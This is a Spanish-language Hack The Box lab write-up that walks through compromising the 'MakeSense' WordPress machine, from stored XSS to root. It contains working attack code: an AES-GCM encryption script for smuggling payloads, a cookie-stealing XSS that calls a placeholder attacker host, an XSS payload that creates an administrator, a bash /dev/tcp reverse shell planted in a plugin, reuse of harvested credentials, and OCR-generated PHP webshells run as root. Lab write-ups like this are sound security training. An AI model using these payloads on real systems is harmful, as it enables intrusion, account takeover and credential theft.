---
title: "HTB MakeSense - Write-Up"
date: 2026-11-09
categories: [Hack The Box]
tags: [wordpress, aes-gcm, stored-xss, privilege-escalation-bot, ocr-rce, linux-privesc]
---

## Introducción

MakeSense es una máquina Linux de dificultad media en Hack The Box centrada en WordPress. El punto de entrada es un XSS almacenado en una funcionalidad de "mensaje de voz" cuyo payload va cifrado en el cliente con una clave AES hardcodeada, lo que obliga a replicar el cifrado en un script propio para poder inyectar el XSS. La escalada dentro de WordPress tiene una vuelta de tuerca: el bot que revisa los mensajes no es administrador, sino un usuario con permisos muy limitados, por lo que hay que encontrar la única acción que sí le funciona para crear un administrador real. La escalada final a root pasa por un servicio interno de OCR que ejecuta como root y permite convertir cualquier texto "reconocido" por Tesseract en un fichero arbitrario (incluido PHP) dentro de su propio directorio servido por el intérprete PHP.

**Ruta general:** Reconocimiento de un WordPress (tema `webagency`) con un formulario de contacto y una función de "mensaje de voz" → lectura de `whisper-wrapper.js` y `main.js`, que revelan una clave AES-GCM hardcodeada y el flujo de dos peticiones AJAX (`submit_contact_form` → `save_voice_results`) → replicación en Python del cifrado AES-GCM (SHA-256 sobre la clave + IV de 12 bytes + Base64) para poder enviar un payload propio → inyección de un XSS almacenado en el campo `transcription` (el propio comentario del desarrollador delata la intención: *"Map spoken words to their symbol equivalents for XSS injection"*) → el bot que revisa los mensajes resulta ser el usuario `walter`, con un rol muy limitado (todos los intentos de crear usuario o cambiar contraseña devuelven 403, salvo uno) → el payload que sí funciona usa el nonce de `/wp-admin/user-new.php` para crear un administrador real (`vador`) → login como `vador` → RCE activando y editando un plugin desde el Editor de archivos de plugin → shell como `www-data` → credenciales de BD en `wp-config.php` (`walter` / contraseña reutilizada a nivel de sistema) → SSH como `walter` (flag de usuario) → servicio interno OCR en `127.0.0.1:8001` corriendo como root, protegido con Basic Auth (misma contraseña de `walter`) → abuso de su función de "guardar como fichero" para convertir un texto reconocido por Tesseract en un webshell PHP dentro de su propio `saved/` → RCE como root.

## Fase 1 — Reconocimiento y la verdadera petición del formulario

Solo hay dos puertos abiertos: SSH (22) y HTTPS (443). El 443 aloja un WordPress con tema personalizado (`webagency`), con cuatro nombres de empleados ficticios y un formulario de contacto.

Capturando el envío del formulario se observa algo revelador: la petición visible en Network no es la que realmente procesa el servidor.

```
GET /robots.txt/?name=test&email=test%40test.com&phone=1234567890&message=Testing HTTP/1.1
Host: 10.129.146.111
```

> **Punto clave:** ese GET a `/robots.txt/` es un envío de formulario HTML "normal" que no ha sido interceptado por el JavaScript del tema; es un señuelo/fallo de implementación, no la petición real. La lógica real va por AJAX a `admin-ajax.php`, como es habitual en WordPress.

Añadiendo `makesense.htb` a `/etc/hosts` (el vhost correcto, visible en el certificado TLS) y revisando el código fuente, aparece el bloque `whisper-wrapper-js-extra`, que expone la variable `webagency_ajax` con `ajax_url` (`/wp-admin/admin-ajax.php`), un `nonce` inicial y `theme_url`. También se detecta un botón flotante de "llamada" que grababa un mensaje de voz.

## Fase 2 — Ingeniería inversa de `whisper-wrapper.js` y `main.js`

Descargando el script del tema:

```bash
curl -k https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js -o whisper-wrapper.js
```

Dentro aparece la clave de cifrado hardcodeada:

```javascript
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

Y la función `encryptPayload`, que:

1. Convierte el payload `{transcription, summary}` a JSON.
2. Deriva la clave AES haciendo `SHA-256` sobre la clave anterior.
3. Cifra con **AES-GCM** usando un IV aleatorio de 12 bytes.
4. Concatena `IV + texto_cifrado` y lo codifica en Base64.

Además, la función `applySymbolMapping` traduce palabras "habladas" a símbolos (`open bracket` → `<`, `slash` → `/`, etc.) con este comentario del desarrollador encima:

```javascript
/**
* Map spoken words to their symbol equivalents for XSS injection
* @param {string} text - The text to apply mapping to
* @returns {string} Text with symbols replaced
*/
```

> **Por qué funciona:** el propio comentario del autor delata la vulnerabilidad: la transcripción de voz, una vez convertida a símbolos, se guarda sin sanitizar y se renderiza en el navegador del administrador cuando revisa los mensajes. Es un XSS almacenado diseñado para dictarse por voz, pero que se puede inyectar directamente por API sin grabar nada.

En `main.js` se localiza el flujo completo (función `processTextSubmission`):

1. `POST admin-ajax.php` con `action=submit_contact_form` → devuelve un `post_id`.
2. El frontend cifra `{transcription, summary}` con la clave anterior.
3. `POST admin-ajax.php` con `action=save_voice_results`, `post_id` y `encrypted_payload` → el servidor descifra y guarda `transcription` tal cual en la base de datos.

## Fase 3 — Replicar el cifrado en Python y disparar el XSS

Se reproduce el cifrado AES-GCM en Python con la librería `cryptography` (instalada en un entorno virtual para evitar el error `externally-managed-environment` de Kali):

```python
import hashlib, os, base64, json
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

ENCRYPTION_KEY = "bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI"

def encrypt_payload(payload_dict):
    payload_json = json.dumps(payload_dict).encode('utf-8')
    key_material = hashlib.sha256(ENCRYPTION_KEY.encode('utf-8')).digest()
    iv = os.urandom(12)
    aesgcm = AESGCM(key_material)
    encrypted_data = aesgcm.encrypt(iv, payload_json, None)
    combined = iv + encrypted_data
    return base64.b64encode(combined).decode('utf-8')
```

El script crea primero el post (`submit_contact_form`) para obtener un `post_id`, y después envía el payload cifrado (`save_voice_results`) con el XSS en el campo `transcription`:

```python
data = {
    "action": "save_voice_results",
    "nonce": NONCE,
    "post_id": post_id,
    "encrypted_payload": encrypt_payload({
        "transcription": "<script>fetch('http://MI_IP:8000/?c='+document.cookie)</script>",
        "summary": "Resumen de prueba"
    })
}
requests.post(AJAX_URL, data=data, verify=False)
```

Con un `python3 -m http.server 8000` escuchando, el bot ejecuta el script y llega una petición:

```
GET /?c=wp-settings-time-3=1794226348 HTTP/1.1
```

> **Nota:** solo llega la cookie `wp-settings-time-3`, no la cookie de sesión `wordpress_logged_in_...`, porque WordPress marca esa cookie como `HttpOnly` y JavaScript no puede leerla. El `3` del nombre de la cookie indica que el bot es el usuario con ID 3.

## Fase 4 — El bot no es administrador: encontrar la acción que sí funciona

El plan inicial (crear un usuario admin vía API REST, formulario clásico de `user-new.php`, cambio de contraseña en `profile.php`, acciones AJAX inventadas) falla sistemáticamente con **403 Forbidden** o con `0` (respuesta estándar de `admin-ajax.php` cuando la acción no existe o falta el nonce correcto). Un detalle confirma por qué: al intentar loguear como `administrator` WordPress responde *"the username administrator is not registered"*, pero con `walter` responde *"the password you entered is incorrect"* — walter existe, y de hecho es el propio bot (confirmado extrayendo `user_login` del HTML de `profile.php` vía XSS), pero con un rol demasiado bajo para crear usuarios, cambiar su contraseña o subir archivos desde el panel.

El payload que finalmente funciona extrae el nonce correcto directamente del formulario de creación de usuario y envía la petición `createuser` completa en una sola función autoejecutable, lo bastante corta para no truncarse en la base de datos:

```javascript
fetch('/wp-admin/user-new.php').then(r=>r.text()).then(h=>{
    let n=h.match(/name="_wpnonce_create-user" value="([^"]+)"/)[1];
    let d=new FormData();
    d.append('action','createuser');
    d.append('_wpnonce_create-user',n);
    d.append('user_login','vador');
    d.append('email','vador@test.com');
    d.append('pass1','Password123!');
    d.append('pass2','Password123!');
    d.append('role','administrator');
    fetch('/wp-admin/user-new.php',{method:'POST',body:d});
});
```

Este script cifrado se envía como `transcription` siguiendo el mismo flujo de dos pasos. El bot lo ejecuta en el contexto del panel de administración (no en el frontend público), por lo que el nonce que extrae de `user-new.php` sí es válido para crear el usuario.

> **Por qué funciona:** las peticiones anteriores fallaban porque el nonce usado no correspondía a la acción (`createuser`) o porque el fetch se ejecutaba en un contexto (frontend público) donde WordPress no concede ese nonce. Al hacer que el propio XSS pida primero la página `user-new.php` real del panel de administración y extraiga el nonce vigente de ahí, la petición de creación de usuario se vuelve legítima desde el punto de vista de WordPress.

Tras ejecutarse el XSS, el login en `https://makesense.htb/wp-login.php` con `vador` / `Password123!` entra como administrador de pleno derecho.

## Fase 5 — RCE: editor de plugins de WordPress

Con acceso de administrador, se intenta primero el **Editor de archivos del tema** (Apariencia → Editor de archivos del tema), pero el tema `webagency` aparece como inactivo: el servidor no ejecuta `style.css` ni `functions.php` de un tema que no está activo.

> **Punto clave:** un editor de archivos de WordPress solo tiene efecto inmediato sobre temas o plugins **activos**. Editar un fichero de un tema/plugin inactivo no produce ejecución, aunque el guardado se complete sin error.

La solución es activar un plugin instalado (por ejemplo, Akismet), entrar en **Plugins → Editor de archivos de plugin**, seleccionar ese plugin ya activo y sustituir el contenido de uno de sus ficheros PHP por una reverse shell:

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/10.10.15.82/4444 0>&1'");
?>
```

Con `nc -lvnp 4444` escuchando y recargando la web (`https://makesense.htb/`), el código del plugin activo se ejecuta y llega la conexión:

```bash
nc -lvnp 4444
```

### Flag de usuario

Estabilizando la shell (`python3 -c 'import pty; pty.spawn("/bin/bash")'`) y leyendo `wp-config.php`:

```bash
cat /var/www/html/wp-config.php
```

```php
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
```

> **Nota:** la base de datos real es SQLite (`DB_DIR`, `DB_FILE => .ht.sqlite`); las constantes `DB_USER`/`DB_PASSWORD` son configuración "dummy" de MySQL que el plugin SQLite de WordPress exige igualmente, pero que casualmente coincide con una credencial real reutilizada a nivel de sistema.

La contraseña `JbhHDAEgXvri3!` funciona también para el usuario de sistema `walter`:

```bash
ssh walter@makesense.htb
```

```bash
cat /home/walter/user.txt
```

## Fase 6 — Escalada de privilegios: servicio OCR interno

Enumerando puertos locales como `walter`:

```bash
ss -tulpn
```

```
tcp   LISTEN 0      4096       127.0.0.1:8001      0.0.0.0:*
```

```bash
ps aux | grep 8001
```

```
root        1409  0.0  0.7 228488 31588 ?        S    11:35   0:00 php -S 127.0.0.1:8001 -t /root/ocr4/
```

> **Punto clave:** el servicio en el 8001 es el servidor embebido de PHP (`php -S`) corriendo como **root**, sirviendo el directorio `/root/ocr4/`. El usuario `walter` no puede leer ese directorio directamente, pero sí puede interactuar con el servicio a través de HTTP.

El servicio pide autenticación básica, y la misma contraseña de `walter` funciona:

```bash
curl -i -u walter:JbhHDAEgXvri3! http://127.0.0.1:8001/
```

La interfaz es un "pizarrón" donde se dibuja texto, Tesseract lo reconoce, y el texto reconocido se puede guardar como fichero con el nombre que el usuario indique — sin validar la extensión. El flujo real, visible al interceptar la petición con Burp, tiene dos pasos:

1. `POST /` con `canvas_image` (PNG en Base64) → la respuesta incluye un `ocr_id` con el texto ya reconocido.
2. `POST /` con `ocr_id`, `filename` y `save_output=Save` → el servidor guarda el texto reconocido en `saved/<filename>`, servido por el mismo `php -S` como root.

> **Por qué funciona:** el servicio no valida ni la extensión del fichero de salida ni el contenido reconocido por el OCR. Si el texto que Tesseract "lee" en la imagen es código PHP válido, el fichero `.php` guardado en `saved/` se ejecuta con los privilegios del proceso que lo sirve — es decir, como root.

### El reto: que Tesseract lea el PHP sin errores

Los primeros intentos (dibujar a mano en el canvas, usar fuentes genéricas) producen errores de reconocimiento en los símbolos (`'`, `[`, `]`), que Tesseract confunde con comillas tipográficas o paréntesis, invalidando la sintaxis PHP resultante.

La solución es generar la imagen programáticamente con la librería GD de PHP (ya presente en el sistema, sin depender de PIL/ImageMagick), usando una fuente monoespaciada ancha y clara, y omitiendo la etiqueta de cierre `?>` para evitar que se fragmente:

```bash
cat > /tmp/gen.php <<'EOF'
<?php
$txt = $argv[1];
$font = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf";
$im = imagecreatetruecolor(2000, 120);
$white = imagecolorallocate($im, 255, 255, 255);
$black = imagecolorallocate($im, 0, 0, 0);
imagefilledrectangle($im, 0, 0, 2000, 120, $white);
imagettftext($im, 44, 0, 20, 80, $black, $font, $txt);
imagepng($im, "/tmp/payload.png");
EOF

php /tmp/gen.php '<?php system("id");'
```

Verificación local con el mismo modo de página que usa el servicio (`--psm 6`), antes de enviarlo:

```bash
tesseract /tmp/payload.png stdout --psm 6
```

```
<?php system("id");
```

### Ejecución como root

```bash
B64=$(base64 -w0 /tmp/payload.png)
curl -s -u "walter:JbhHDAEgXvri3!" -c jar.txt -b jar.txt http://127.0.0.1:8001/ \
  --data-urlencode "canvas_image=data:image/png;base64,$B64" -o r.html

OCR=$(grep -oP 'name="ocr_id" value="\K[^"]+' r.html)

curl -s -u "walter:JbhHDAEgXvri3!" -c jar.txt -b jar.txt http://127.0.0.1:8001/ \
  --data-urlencode "ocr_id=$OCR" --data-urlencode "filename=shell.php" \
  --data-urlencode "save_output=Save" -o s.html

curl -s -u "walter:JbhHDAEgXvri3!" http://127.0.0.1:8001/saved/shell.php
```

```
uid=0(root) gid=0(root) groups=0(root)
```

Para leer la flag directamente, se repite el proceso generando la imagen con el comando deseado ya fijo (el PHP guardado ejecuta ese comando concreto, no un parámetro arbitrario salvo que se dibuje `$_GET[cmd]` con éxito):

```bash
php /tmp/gen.php '<?php system("cat /root/root.txt");'
```

Y repitiendo el envío con un nuevo `filename` (p. ej. `flag.php`):

```bash
curl -s -u "walter:JbhHDAEgXvri3!" http://127.0.0.1:8001/saved/flag.php
```

### Flag de root

```bash
cat /root/root.txt
```
